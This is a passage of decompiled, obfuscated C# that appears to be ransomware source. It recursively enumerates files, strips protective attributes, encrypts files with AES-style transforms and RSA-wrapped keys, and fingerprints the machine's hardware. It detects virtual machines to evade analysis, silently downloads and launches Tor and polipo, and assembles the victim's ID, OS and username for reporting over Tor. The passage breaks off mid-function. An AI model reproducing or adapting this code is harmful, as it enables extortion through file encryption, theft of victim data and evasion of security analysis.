				class33_0.short_0[Class27.smethod_52(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class27.smethod_52(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class33_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class33_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class33_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	static void smethod_37(int int_0, byte[] byte_0, Class29.Class31 class31_0, int int_1)
	{
		if (class31_0.int_0 < class31_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class31_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class31_0.int_2);
				class31_0.int_2 += 8;
			}
			class31_0.byte_0 = byte_0;
			class31_0.int_0 = int_1;
			class31_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static Class3 smethod_38()
	{
		return Class3.class3_0 ?? (Class3.class3_0 = new Class3());
	}

	static uint smethod_39(uint uint_0, uint uint_1)
	{
		return uint_0 + uint_1;
	}

	static void smethod_40(Class21 class21_0, string string_0)
	{
		for (int i = 0; i < Class27.smethod_43(class21_0).Length; i++)
		{
			Class21.Class22 @class = Class27.smethod_43(class21_0)[i];
			string text = Path.Combine(string_0, @class.method_0());
			Directory.CreateDirectory(Path.GetDirectoryName(text));
			if (!Class27.smethod_63(@class))
			{
				Class27.smethod_62(text, @class.method_0(), class21_0);
			}
			class21_0.eventHandler_0?.Invoke(class21_0, new Class21.EventArgs0(i + 1, Class27.smethod_43(class21_0).Length, @class.method_0()));
		}
	}

	[DllImport("netapi32")]
	static extern int NetApiBufferFree(IntPtr intptr_0);

	static void smethod_41(Class29.Class31 class31_0, int int_0)
	{
		class31_0.uint_0 >>= int_0;
		class31_0.int_2 -= int_0;
	}

	static string smethod_42(string string_0, string string_1, string string_2)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		ManagementObjectEnumerator enumerator = new ManagementClass(string_2).GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				if (!(current.get_Item(string_0).ToString() != "True") && !(text != ""))
				{
					try
					{
						text = current.get_Item(string_1).ToString();
						return text;
					}
					catch
					{
					}
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	static Class21.Class22[] smethod_43(Class21 class21_0)
	{
		if (class21_0.class22_0 == null)
		{
			class21_0.class22_0 = Class27.smethod_123(class21_0).ToArray();
		}
		return class21_0.class22_0;
	}

	unsafe static string smethod_44(string string_0, int int_0)
	{
		void* ptr = stackalloc byte[20];
		*(double*)ptr = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (*(double*)ptr < 2.0)
		{
			return string_0;
		}
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)((byte*)ptr + 8) = 0;
		while ((double)(*(int*)((byte*)ptr + 8)) < *(double*)ptr)
		{
			if (*(int*)((byte*)ptr + 8) > 0)
			{
				stringBuilder.Append(Environment.NewLine);
			}
			*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8) * int_0;
			*(int*)((byte*)ptr + 16) = Math.Min(int_0, string_0.Length - *(int*)((byte*)ptr + 12));
			string value = string_0.Substring(*(int*)((byte*)ptr + 12), *(int*)((byte*)ptr + 16));
			stringBuilder.Append(value);
			(*(int*)((byte*)ptr + 8))++;
		}
		return stringBuilder.ToString();
	}

	static string smethod_45()
	{
		string string_ = "Win32_NetworkAdapterConfiguration";
		string string_2 = "MACAddress";
		string string_3 = "IPEnabled";
		return Class27.smethod_42(string_3, string_2, string_);
	}

	static bool smethod_46()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Console", writable: true);
			if (Registry.GetValue(registryKey.ToString(), "WordLoad", null) == null)
			{
				registryKey.SetValue("WordLoad", 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	unsafe static int smethod_47(byte[] byte_0, int int_0, int int_1, Class29.Class32 class32_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class32_0.int_0;
		if (int_1 > class32_0.int_1)
		{
			int_1 = class32_0.int_1;
		}
		else
		{
			*(int*)ptr = (class32_0.int_0 - class32_0.int_1 + int_1) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_1;
		*(int*)((byte*)ptr + 8) = int_1 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class32_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_0, *(int*)((byte*)ptr + 8));
			int_0 += *(int*)((byte*)ptr + 8);
			int_1 = *(int*)ptr;
		}
		Array.Copy(class32_0.byte_0, *(int*)ptr - int_1, byte_0, int_0, int_1);
		class32_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class32_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_5([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	unsafe static string smethod_48(string string_0)
	{
		void* ptr = stackalloc byte[9];
		*(int*)ptr = string_0.Length;
		char[] array = new char[*(int*)ptr];
		int length = 0;
		((byte*)ptr)[8] = 1;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			char c = string_0[*(int*)((byte*)ptr + 4)];
			if (c == '"' && (*(int*)((byte*)ptr + 4) == 0 || string_0[*(int*)((byte*)ptr + 4) - 1] != '\\'))
			{
				((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
			}
			if (((byte*)ptr)[8] == 0 || (c != ' ' && c != '\r' && c != '\n' && c != '\t' && c != '\b' && c != '\f'))
			{
				array[length++] = c;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return new string(array, 0, length);
	}

	static string smethod_49(int int_0, bool bool_0 = false)
	{
		Miscellaneous.Class19 CS_0024_003C_003E8__locals0 = new Miscellaneous.Class19();
		CS_0024_003C_003E8__locals0.random_0 = new Random();
		string text = "";
		text = ((!bool_0) ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		return new string((from string_0 in Enumerable.Repeat(text, int_0)
			select string_0[CS_0024_003C_003E8__locals0.random_0.Next(string_0.Length)]).ToArray());
	}

	static void smethod_50(uint uint_0, byte[] byte_0, int int_0)
	{
		byte_0[int_0] = (byte)uint_0;
		byte_0[int_0 + 1] = (byte)(uint_0 >> 8);
		byte_0[int_0 + 2] = (byte)(uint_0 >> 16);
		byte_0[int_0 + 3] = (byte)(uint_0 >> 24);
	}

	static void smethod_51(Class29.Class32 class32_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class32_0.byte_0[class32_0.int_0++] = class32_0.byte_0[int_0++];
			class32_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static short smethod_52(int int_0)
	{
		return (short)((Class29.Class35.byte_0[int_0 & 0xF] << 12) | (Class29.Class35.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class29.Class35.byte_0[(int_0 >> 8) & 0xF] << 4) | Class29.Class35.byte_0[int_0 >> 12]);
	}

	static void smethod_53(byte[] byte_0, byte[] byte_1)
	{
		try
		{
			if (Class13.list_0.Count != 0)
			{
				string[] array = Class13.list_0.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class14.smethod_0(array[i], byte_1, byte_0, 8, 16);
				}
			}
			Class13.list_0.Clear();
			if (Class13.list_1.Count != 0)
			{
				string[] array = Class13.list_1.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class14.smethod_0(array[i], byte_1, byte_0, 16, 32);
				}
			}
			Class13.list_1.Clear();
			if (Class13.list_2.Count != 0)
			{
				string[] array = Class13.list_2.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class14.smethod_0(array[i], byte_1, byte_0, 32, 64);
				}
			}
			Class13.list_2.Clear();
		}
		catch (Exception)
		{
		}
	}

	static byte[] smethod_54(byte[] byte_0, string string_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		try
		{
			rSACryptoServiceProvider.FromXmlString($"<RSAKeyValue><Modulus>{string_0}</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
		}
		catch (Exception)
		{
		}
		finally
		{
			rSACryptoServiceProvider.Clear();
		}
		return null;
	}

	static int smethod_55(JsonNode jsonNode_0)
	{
		return (int)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(int));
	}

	static string smethod_56()
	{
		return Class27.smethod_65("Win32_BaseBoard", "Model") + Class27.smethod_65("Win32_BaseBoard", "Manufacturer") + Class27.smethod_65("Win32_BaseBoard", "Name") + Class27.smethod_65("Win32_BaseBoard", "SerialNumber");
	}

	unsafe static string smethod_57(byte[] byte_0)
	{
		void* ptr = stackalloc byte[5];
		char[] array = new char[byte_0.Length * 2];
		*(int*)ptr = 0;
		int num = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] >> 4);
			array[num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] & 0xFu);
			array[++num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			(*(int*)ptr)++;
			num++;
		}
		return new string(array);
	}

	static string smethod_58(string string_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(string_0);
		return Miscellaneous.Class15.smethod_0(mD5CryptoServiceProvider.ComputeHash(bytes));
	}

	unsafe static bool smethod_59(Class29.Class34 class34_0, Class29.Class31 class31_0)
	{
		void* ptr = stackalloc byte[12];
		while (true)
		{
			*(int*)ptr = class34_0.int_2;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 8) = Class29.Class34.int_1[class34_0.int_7];
				int num = Class27.smethod_18(class31_0, *(int*)((byte*)ptr + 8));
				if (num >= 0)
				{
					Class27.smethod_41(class31_0, *(int*)((byte*)ptr + 8));
					num += Class29.Class34.int_0[class34_0.int_7];
					while (num-- > 0)
					{
						byte[] byte_ = class34_0.byte_1;
						*(int*)ptr = class34_0.int_8;
						class34_0.int_8 = *(int*)ptr + 1;
						byte_[*(int*)ptr] = class34_0.byte_2;
					}
					if (class34_0.int_8 == class34_0.int_6)
					{
						return true;
					}
					goto IL_0084;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class27.smethod_77(class34_0.class33_0, class31_0)) & -16) == 0)
				{
					byte[] byte_2 = class34_0.byte_1;
					*(int*)ptr = class34_0.int_8;
					class34_0.int_8 = *(int*)ptr + 1;
					byte_2[*(int*)ptr] = (class34_0.byte_2 = (byte)num2);
					if (class34_0.int_8 == class34_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class34_0.byte_2 = 0;
					}
					class34_0.int_7 = num2 - 16;
					class34_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class34_0.int_8 < class34_0.int_5)
				{
					*(int*)((byte*)ptr + 4) = Class27.smethod_18(class31_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class27.smethod_41(class31_0, 3);
						class34_0.byte_0[Class29.Class34.int_9[class34_0.int_8]] = (byte)(*(uint*)((byte*)ptr + 4));
						class34_0.int_8++;
						continue;
					}
					return false;
				}
				class34_0.class33_0 = new Class29.Class33(class34_0.byte_0);
				class34_0.byte_0 = null;
				class34_0.int_8 = 0;
				class34_0.int_2 = 4;
				goto case 4;
			case 2:
				class34_0.int_5 = Class27.smethod_18(class31_0, 4);
				if (class34_0.int_5 >= 0)
				{
					class34_0.int_5 += 4;
					Class27.smethod_41(class31_0, 4);
					class34_0.byte_0 = new byte[19];
					class34_0.int_8 = 0;
					class34_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class34_0.int_4 = Class27.smethod_18(class31_0, 5);
				if (class34_0.int_4 >= 0)
				{
					class34_0.int_4++;
					Class27.smethod_41(class31_0, 5);
					class34_0.int_6 = class34_0.int_3 + class34_0.int_4;
					class34_0.byte_1 = new byte[class34_0.int_6];
					class34_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class34_0.int_3 = Class27.smethod_18(class31_0, 5);
				if (class34_0.int_3 >= 0)
				{
					class34_0.int_3 += 257;
					Class27.smethod_41(class31_0, 5);
					class34_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0084:
			class34_0.int_2 = 4;
		}
	}

	static byte[] smethod_60(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	unsafe static int smethod_61(Class29.Class32 class32_0, Class29.Class31 class31_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class32_0.int_1), Class27.smethod_83(class31_0));
		*(int*)((byte*)ptr + 4) = 32768 - class32_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class27.smethod_13(class31_0, class32_0.byte_0, class32_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class27.smethod_13(class31_0, class32_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class27.smethod_13(class31_0, class32_0.byte_0, class32_0.int_0, int_0);
		}
		class32_0.int_0 = (class32_0.int_0 + *(int*)ptr) & 0x7FFF;
		class32_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static void smethod_62(string string_0, string string_1, Class21 class21_0)
	{
		Class21.Class22 @class = Class27.smethod_128(string_1, class21_0);
		using (FileStream stream_ = File.Create(string_0))
		{
			Class27.smethod_99(@class, class21_0, (Stream)stream_);
		}
		FileInfo fileInfo = new FileInfo(string_0);
		if (fileInfo.Length != @class.method_6())
		{
			throw new InvalidDataException($"Corrupted archive: {string_0} has an uncompressed size {fileInfo.Length} which does not match its expected size {@class.method_6()}");
		}
		File.SetLastWriteTime(string_0, @class.method_10());
	}

	static bool smethod_63(Class21.Class22 class22_0)
	{
		return class22_0.method_0().EndsWith("/");
	}

	static bool smethod_64()
	{
		try
		{
			string text = "";
			text = Class27.smethod_98("wmic", "path win32_VideoController get name");
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			Class27.smethod_98("tasklist", "m");
			if (text.Contains("VirtualBox Graphics Adapter") || text.Contains("VMware SVGA") || text.Contains("Parallels Video Adapter") || text.Contains("PVM Additions S3 Trio32/64") || text.Contains("S3 Trio32/64") || Class27.smethod_34("xenservice") || Class27.smethod_34("VMSrvc") || Class27.smethod_34("VMUSrvc") || Class27.smethod_34("VBoxTrayToolWndClass") || Class27.smethod_34("VBoxTrayToolWnd") || Class27.smethod_34("vmtoolsd") || Class27.smethod_34("vmwaretray") || Class27.smethod_34("vmwareuser") || Class27.smethod_34("VGAuthService") || Class27.smethod_34("vmacthlp") || Class27.smethod_34("prl_cc") || Class27.smethod_34("prl_tools") || Class27.smethod_34("vmtoolsd"))
			{
				text = Class27.smethod_98("wmic", "path MSAcpi_ThermalZoneTemperature");
			}
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static string smethod_65(string string_0, string string_1)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		ManagementObjectEnumerator enumerator = new ManagementClass(string_0).GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				if (!(text != ""))
				{
					try
					{
						text = current.get_Item(string_1).ToString();
						return text;
					}
					catch
					{
					}
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	unsafe static void smethod_66(string string_0)
	{
		void* ptr = stackalloc byte[12];
		try
		{
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			if (files != null)
			{
				string[] array = files;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string text = array[*(int*)((byte*)ptr + 8)];
					if (Class27.smethod_67(text))
					{
						*(long*)ptr = Class27.smethod_68(text) / 1048576L;
						if (Class4.Class5.smethod_28())
						{
							if (*(long*)ptr < 10L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 1, 2);
							}
							else if (*(long*)ptr < 20L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 3, 4);
							}
							else if (*(long*)ptr < 30L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 5, 6);
							}
							else if (*(long*)ptr < 40L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 7, 8);
							}
							else if (*(long*)ptr < 50L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 9, 10);
							}
							else if (*(long*)ptr < 60L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 11, 12);
							}
							else if (*(long*)ptr < 70L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 13, 14);
							}
							else if (*(long*)ptr < 80L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 15, 16);
							}
							else if (*(long*)ptr < 90L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 17, 18);
							}
							else if (*(long*)ptr < 100L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 19, 20);
							}
							else if (*(long*)ptr < 1000L)
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 32, 64);
							}
							else
							{
								Class14.smethod_0(text, Class8.Class9.smethod_2(), Class8.Class9.smethod_4(), 64, 128);
							}
						}
						else if (*(long*)ptr < 100L)
						{
							Class13.list_0.Add(text);
						}
						else if (*(long*)ptr < 1000L)
						{
							Class13.list_1.Add(text);
						}
						else
						{
							Class13.list_2.Add(text);
						}
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			if (directories != null)
			{
				string[] array = directories;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string string_ = array[*(int*)((byte*)ptr + 8)];
					if (Class27.smethod_112(string_))
					{
						Class27.smethod_66(string_);
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			Miscellaneous.smethod_0(string_0);
		}
		catch (Exception)
		{
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_6([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static bool smethod_67(string string_0)
	{
		try
		{
			if (Class4.Class5.smethod_52().Contains(new FileInfo(string_0).Name.ToLower()))
			{
				return false;
			}
			if (Class4.Class5.smethod_58() + "." + Class4.Class5.smethod_60() == new FileInfo(string_0).Name)
			{
				return false;
			}
			string text = File.GetAttributes(string_0).ToString().ToLower();
			if (text.Contains("system"))
			{
				return false;
			}
			if (text.Contains("hidden") || text.Contains("readonly") || text.Contains("archive"))
			{
				File.SetAttributes(string_0, FileAttributes.Normal);
			}
			if (new FileInfo(string_0).Length >> 10 == 0L)
			{
				return false;
			}
			if (Class4.Class5.smethod_26() && new FileInfo(string_0).DirectoryName!.Contains("\\\\"))
			{
				return true;
			}
			if (Class4.Class5.smethod_46().Contains(new FileInfo(string_0).Extension.ToLower().Replace(".", "")))
			{
				return true;
			}
			if (Class4.Class5.smethod_26() && !(Environment.SystemDirectory.Substring(0, 1) == new FileInfo(string_0).FullName.Substring(0, 1)))
			{
				return true;
			}
			return false;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static long smethod_68(string string_0)
	{
		try
		{
			return new FileInfo(string_0).Length;
		}
		catch (Exception)
		{
		}
		return 0L;
	}

	static bool smethod_69(Class29.Class31 class31_0)
	{
		return class31_0.int_0 == class31_0.int_1;
	}

	static string smethod_70(OperatingSystem operatingSystem_0)
	{
		string result = "unknown";
		switch (operatingSystem_0.Platform)
		{
		case PlatformID.Win32NT:
			result = Class27.smethod_114(operatingSystem_0);
			break;
		case PlatformID.Win32Windows:
			result = Miscellaneous.Class16.smethod_0(operatingSystem_0);
			break;
		}
		return result;
	}

	unsafe static bool smethod_71(Class29.Class30 class30_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class27.smethod_92(class30_0.class32_0);
		while (num >= 258)
		{
			*(int*)ptr = class30_0.int_4;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class27.smethod_77(class30_0.class33_0, class30_0.class31_0)) & -256) == 0)
				{
					Class27.smethod_93(class30_0.class32_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class30_0.int_6 = Class29.Class30.int_0[num2 - 257];
					class30_0.int_5 = Class29.Class30.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class30_0.class33_1 = null;
				class30_0.class33_0 = null;
				class30_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class30_0.int_5 > 0)
				{
					class30_0.int_4 = 8;
					*(int*)((byte*)ptr + 4) = Class27.smethod_18(class30_0.class31_0, class30_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class27.smethod_41(class30_0.class31_0, class30_0.int_5);
					class30_0.int_6 += *(int*)((byte*)ptr + 4);
				}
				class30_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class27.smethod_77(class30_0.class33_1, class30_0.class31_0);
				if (num2 >= 0)
				{
					class30_0.int_7 = Class29.Class30.int_2[num2];
					class30_0.int_5 = Class29.Class30.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class30_0.int_5 > 0)
				{
					class30_0.int_4 = 10;
					*(int*)((byte*)ptr + 8) = Class27.smethod_18(class30_0.class31_0, class30_0.int_5);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class27.smethod_41(class30_0.class31_0, class30_0.int_5);
					class30_0.int_7 += *(int*)((byte*)ptr + 8);
				}
				Class27.smethod_12(class30_0.class32_0, class30_0.int_6, class30_0.int_7);
				num -= class30_0.int_6;
				class30_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static ICryptoTransform smethod_72(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern int SystemParametersInfo(int int_0, int int_1, string string_0, int int_2);

	static string smethod_73()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Keyboard Layout\\Preload");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + $"{Class27.smethod_108((string)registryKey.GetValue(name))}" + ",";
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	static string smethod_74()
	{
		return Class27.smethod_65("Win32_DiskDrive", "Model") + Class27.smethod_65("Win32_DiskDrive", "Manufacturer") + Class27.smethod_65("Win32_DiskDrive", "Signature") + Class27.smethod_65("Win32_DiskDrive", "TotalHeads");
	}

	unsafe static bool smethod_75(int int_0)
	{
		void* ptr = stackalloc byte[14];
		*(int*)ptr = 0;
		while (true)
		{
			Class27.smethod_29(new string[2] { "tor", "polipo" });
			try
			{
				string text = "";
				text = Path.Combine(Path.GetTempPath(), "Tor Bundle");
				if (!File.Exists(text + "\\Tor\\tor.exe") && !File.Exists(text + "\\Tor\\polipo.exe"))
				{
					byte[] array = null;
					using WebClient webClient = new WebClient();
					webClient.Headers.Add("user-agent", Class4.Class5.Class7.smethod_4());
					webClient.Headers.Add("Accept", "application/vnd.github.v3.raw");
					array = webClient.DownloadData(Class4.Class5.Class7.smethod_0());
					if (array != null)
					{
						string text2 = Path.Combine(Path.GetTempPath(), Path.GetTempFileName() + ".zip");
						File.WriteAllBytes(text2, array);
						Class21 @class = new Class21(text2);
						Class27.smethod_40(@class, text);
						@class.System_002EIDisposable_002EDispose();
						File.Delete(text2);
					}
					array = webClient.DownloadData(Class4.Class5.Class7.smethod_2());
					if (array != null)
					{
						File.WriteAllBytes(text + "\\Tor\\polipo.exe", array);
					}
				}
				if (File.Exists(text + "\\Tor\\tor.exe") && File.Exists(text + "\\Tor\\polipo.exe"))
				{
					Process process = new Process();
					process.StartInfo.FileName = text + "\\Tor\\tor.exe";
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.WorkingDirectory = text + "\\Tor";
					process.Start();
					Process process2 = new Process();
					process2.StartInfo.FileName = text + "\\Tor\\polipo.exe";
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.StartInfo.Arguments = $"socksParentProxy={Class4.Class5.Class7.smethod_6().Split(new char[1] { ':' })[0]}:{Class4.Class5.Class7.smethod_6().Split(new char[1] { ':' })[1]}";
					process2.StartInfo.WorkingDirectory = text + "\\Tor";
					process2.Start();
					Thread.Sleep(10000);
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://check.torproject.org");
					httpWebRequest.Timeout = 60000;
					WebProxy webProxy = new WebProxy($"http://{Class4.Class5.Class7.smethod_8().Split(new char[1] { ':' })[0]}:{Class4.Class5.Class7.smethod_8().Split(new char[1] { ':' })[1]}");
					httpWebRequest.Method = "GET";
					webProxy.BypassProxyOnLocal = false;
					httpWebRequest.Proxy = webProxy;
					httpWebRequest.UserAgent = Class4.Class5.Class7.smethod_4();
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					string text3 = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
					if (text3.Contains("Sorry. You are not using Tor."))
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					if (text3.Contains("Congratulations. This browser is configured to use Tor."))
					{
						string text4 = "";
						text4 = Class4.Class5.Class7.smethod_12();
						text4 = Regex.Replace(text4, "%1", Convert.ToString(int_0));
						Miscellaneous.Class16 class16_ = Class27.smethod_88();
						text4 = Regex.Replace(text4, "%2", Class27.smethod_28(class16_));
						text4 = Regex.Replace(text4, "%3", Environment.UserName);
						string text5 = "";
						text5 = Class27.smethod_129();
						if (string.IsNullOrEmpty(text5))
						{
							text5 = "NULL";
						}
						text4 = Regex.Replace(text4, "%4", text5);
